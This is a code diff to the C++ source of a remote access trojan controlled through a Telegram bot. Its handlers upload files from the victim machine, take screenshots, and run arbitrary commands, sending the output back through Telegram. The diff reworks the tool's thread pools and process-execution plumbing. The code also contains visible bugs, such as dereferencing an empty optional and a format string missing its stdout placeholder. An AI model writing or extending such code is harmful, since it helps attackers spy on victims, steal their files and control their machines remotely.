@@ -4,7 +4,9 @@
 #include "rat/system.hpp"
 #include "rat/media.hpp"
 #include <algorithm>
+#include <chrono>
 #include <mutex>
+#include <optional>
 #include <thread>
 #include <fmt/core.h>
 #include <fmt/chrono.h>
@@ -41,7 +43,7 @@ void Handler::handleGetCommand() {
         this->bot->sendFile(file_path);
     } else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) {
         // medium file → async via thread pool
-        this->process_pool->enqueue([this, &file_path] {
+        this->long_process_pool->enqueue([this, &file_path] {
             
             DEBUG_LOG("Async upload {}", file_path.string());
             std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
@@ -64,7 +66,7 @@ void Handler::handleScreenshotCommand() {
     auto image_path = std::filesystem::path(
         fmt::format("{}.png", rat::system::getCurrentDateTime_Underscored())
         );
-    this->process_pool->enqueue([this, image_path] {
+    this->short_process_pool->enqueue([this, image_path] {
         std::string output_buffer;
         bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
         
@@ -108,22 +110,32 @@ void Handler::parseAndHandleProcessCommand() {
         this->bot->sendMessage(fmt::format("Invalid timeout value: {}", timeout_str));
         return;
     }
-
-    this->timer_pool->enqueue([this, message_text, timeout]() {
-        ::rat::process::runAsyncProcess(
-            message_text,
-            std::chrono::milliseconds(timeout),
-            [this](std::optional<::rat::process::ProcessResult> result) {
-                std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
-                if (result) {
-                    this->backing_bot->sendMessage(
-                        fmt::format("Exit: {}\nSTDOUT:\nSTDERR:{}", result->exitCode, result->stdoutStr, result->stderrStr)
-                    );
-                } else {
-                    this->backing_bot->sendMessage(fmt::format("Process timed out or failed\n STDERR:{}", result->stderrStr));
-                }
+    ::rat::threading::ThreadPool* p_process_pool; 
+    if (timeout > 4000 || this->short_process_pool->getPendingWorkersCount() > 1) {
+      
+        p_process_pool = this->long_process_pool.get(); 
+    }else {
+        p_process_pool = this->short_process_pool.get();
+    }
+    auto process_lambda = [this](std::optional<::rat::process::ProcessResult> result) {
+            std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
+            if (result) {
+                this->backing_bot->sendMessage(
+                fmt::format("Exit: {}\nSTDOUT:\nSTDERR:{}", result->exit_code, result->stdout_str, result->stderr_str)
+              );
+            } else {
+                this->backing_bot->sendMessage(fmt::format("Process timed out or failed\n STDERR:{}", result->stderr_str));
             }
-        );
-    });
+        };
+ 
+    ::rat::process::ProcessContext process_context = {
+        .command = message_text,
+        .timeout = std::chrono::milliseconds(timeout),
+        .thread_pool = p_process_pool, // Assuming you have a thread_pool member
+        .mutexes    =  std::nullopt,  // Assuming you have a vector of mutexes
+        .callback = process_lambda
+    };
+    ::rat::process::runAsyncProcess(process_context);
+
 }
 }//namespace rat::handler
